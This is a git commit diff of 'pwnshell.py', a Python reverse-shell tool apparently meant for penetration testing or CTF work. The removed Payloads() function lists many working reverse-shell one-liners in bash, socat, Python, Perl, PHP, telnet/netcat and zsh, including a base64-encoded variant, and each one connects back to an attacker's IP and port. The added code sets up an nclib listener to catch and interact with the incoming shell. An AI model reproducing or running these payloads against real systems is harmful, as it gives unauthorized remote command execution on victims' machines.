2f3273a8f0303e5a1fb0d1906540e8e2ff5a5319
zAbuQasem <74984708+zAbuQasem@users.noreply.github.com>
2021-05-12 03:50:17 +0000

    Update pwnshell.py

--- pwnshell.py
+++ pwnshell.py
@@ -4,20 +4,26 @@ import base64
 import requests
 import os
 import argparse
+import nclib
+from threading import Thread
 
 def main():
-	global args , addrs
-	addrs = netifaces.ifaddresses('wlp2s0') #change
+	global args , default_ip , nc , port
+	ip_address = netifaces.ifaddresses('eth0')[2] #change interface
+	default_ip = ip_address[0]['addr'] 
 	parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
-	parser.add_argument('-H','--host' ,help='LOCAL IP ADDRESS',default='tun0')
+	parser.add_argument('-H','--host' ,help='LOCAL IP ADDRESS',default=default_ip)
 	parser.add_argument('-p','--port' ,help='LOCAL PORT NUMBER',type=int,default=9001)
-	parser.add_argument("-t","--type",help='Payload Type [windows/linux]',type=str,required=True)
+	parser.add_argument("-t","--type",help='Payload Type [windows/linux]',type=str,default='linux')
 	parser.add_argument("-u","--url",help='Target url [http://localhost:8888/h.php?meow=PWN]')
 	#parser.add_argument("-c","--cookie",help='Provide a Cookie')
 	#parser.add_argument("-l","--header",help='Provide a header')
 	#parser.add_argument("-m","--method",help='Request Method')
 	#parser.add_argument("-d","--data",help='Post data')
 	args = parser.parse_args()
+	ip=default_ip
+	ip=args.host
+	port=args.port
 
 
 	if args.type == "linux" or args.type == "l":
@@ -25,54 +31,26 @@ def main():
 	elif args.type == "windows" or args.type == "w":
 		shell_windows()
 	else:
-		print("[!]Invalid Value -> "+args.type)
+		print("[!]Invalid Value -> "+ args.type)
 
 
 
 def shell_linux():
-	print ("")
-	Payloads()
-	#os.system(socat1)
+	print("listening on port: "+ f"{port}" + "\n" + "Default ip for payloads: "+ f"{default_ip}")
+	print ("---> Waiting For a connection ")
+	aa()
+	nc.close()
 
 
-#////////////////////////SHELLS////////////////////////////////////#
-def Payloads():
-	ip=addrs
-	ip=args.host
-	port=args.port
-	#bash	
-	bash196=f'''0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196'''
-	bash_dev=f'''/bin/bash -c "/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"'''
-	bash_readline=f'''exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'''
-	bash5=f'''sh -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5'''
-	#Socat
-	socat=f'''socat TCP:{ip}:{port} EXEC:'sh',pty,stderr,setsid,sigint,sane'''
-	#python
-	python2=f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''''
-	python3=f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''''
-	#Bsd
-	BSD=f'''mkfifo /tmp/lol;nc {ip} {port} 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol'''
-	#telnet
-	telnet=f'''TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | sh 1>$TF'''
-	#php
-	exec1=f'''php -r '$sock=fsockopen("{ip}",{port});exec("sh <&3 >&3 2>&3");\''''
-	shell_exec=f'''php -r '$sock=fsockopen("{ip}",{port});shell_exec("sh <&3 >&3 2>&3");\''''
-	system=f'''php -r '$sock=fsockopen("{ip}",{port});system("sh <&3 >&3 2>&3");\''''
-	weird_qoute=f'''php -r '$sock=fsockopen("{ip}",{port});`sh <&3 >&3 2>&3`;\''''
-	#add pentestmonkey
-	#perl
-	perl=f'''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))'''+'{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};\''
-	perl_no_sh=f'''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''''
-	#zsh
-	zsh=f'''zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY\''''
-	#encoded
-	cli=f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'".encode("utf-8")
-	encoded = base64.b64encode(cli).decode('utf-8')
-	cli2="bash -c '{echo,"+f"{encoded}"+"}|{base64,-d}|{bash,-i}'"
-
-	os.system(socat)
-
+def aa():
+	global nc
+	nc = nclib.Netcat(listen=('', port))
+	nc.interact()
 
 
 if __name__ == '__main__':
 		exit(main())
+
+
+#TODO
+#add payloads to a list or a dict for iteration
